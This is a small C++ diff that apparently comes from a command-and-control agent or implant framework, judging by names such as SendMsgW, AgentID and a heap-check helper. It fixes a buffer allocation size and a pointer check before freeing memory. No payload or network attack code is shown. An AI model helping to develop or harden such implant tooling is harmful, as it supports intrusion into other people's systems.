@@ -914,7 +914,7 @@ auto DECLFN Package::SendMsgW(
 ) -> BOOL {
     PACKAGE* Package = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
 
-    Package->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
+    Package->Buffer = PTR( hAlloc( sizeof( WCHAR ) ) );
     Package->Length = 0;
 
     this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
@@ -1050,7 +1050,7 @@ auto DECLFN Parser::Destroy(
     }
 
     if ( Parser ) {
-        if ( Self->Hp->CheckPtr( Parser->Original ) ) { 
+        if ( Self->Hp->CheckPtr( Parser ) ) { 
             Success = hFree( Parser );
         }
 
